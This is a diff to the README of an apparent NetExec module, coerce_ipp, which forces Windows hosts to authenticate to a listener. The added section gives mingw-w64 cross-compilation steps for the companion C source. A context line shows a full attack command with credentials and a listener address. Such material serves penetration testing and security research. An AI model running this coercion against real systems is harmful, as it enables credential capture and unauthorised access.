@@ -98,8 +98,30 @@ nxc smb 10.10.10.5 -u admin -p 'Passw0rd!' -M coerce_ipp -o LISTENER=10.10.10.1
 
 ---
 
+## C source (`ipp.c`)
+
+`ipp.c` is the C implementation of the coercion technique that this NetExec
+module ports. It targets Windows, but it compiles cleanly on Linux using the
+**mingw-w64** cross-compiler, so you don't need a Windows build machine.
+
+Install the toolchain (Debian/Ubuntu):
+
+```bash
+sudo apt install mingw-w64
+```
+
+Then cross-compile for a 64-bit Windows target:
+
+```bash
+# Standalone executable
+x86_64-w64-mingw32-gcc ipp.c -o ipp.exe
+```
+
+For a 32-bit target, swap in the `i686-w64-mingw32-gcc` compiler instead.
+
+---
+
 ## Credits
 
 - Original technique: [BOF-coerce-ipp](https://github.com/sup3rDav3/IPP)
 - Built as a module for [NetExec](https://github.com/Pennyw0rth/NetExec)
-
